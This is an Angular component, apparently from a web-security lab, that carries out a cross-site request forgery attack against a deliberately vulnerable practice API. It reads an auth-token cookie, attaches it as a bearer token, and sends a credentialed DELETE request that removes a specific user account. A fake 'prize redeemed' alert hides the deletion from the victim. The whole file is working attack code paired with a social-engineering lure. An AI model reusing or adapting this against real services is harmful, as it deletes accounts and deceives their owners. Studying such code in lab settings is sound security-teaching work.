import { Component } from '@angular/core';
import { HttpClient, HttpHeaders } from '@angular/common/http';

@Component({
  selector: 'app-attack',
  templateUrl: './attack.component.html',
  styleUrls: ['./attack.component.css']
})
export class AttackComponent {
  constructor(private http: HttpClient) {}

  attack() {
    const token = this.getJwtToken();
    const headers = new HttpHeaders().set('Authorization', 'Bearer ' + token);
  
    this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
      headers,
      withCredentials: true
    }).subscribe({
      next: () => alert('Prêmio resgatado com sucesso!'),
      error: (err) => console.error('Erro no ataque CSRF:', err)
    });
}

// getCookie(name: string): string | null {
//   const value = `; ${document.cookie}`;
//   console.log(value);
//   const parts = value.split(`; ${name}=`);
//   if (parts.length === 2) return parts.pop()?.split(';').shift() || null;
//   return null;
//   }
  getJwtToken(): string | null {
    const name = 'auth-token';
    const decodedCookie = decodeURIComponent(document.cookie);
    const ca = decodedCookie.split(';');
    for (let i = 0; i < ca.length; i++) {
      let c = ca[i].trim();
      if (c.indexOf(name) === 0) {
        return c.substring(name.length, c.length);
      }
    }
    return null;
  }
}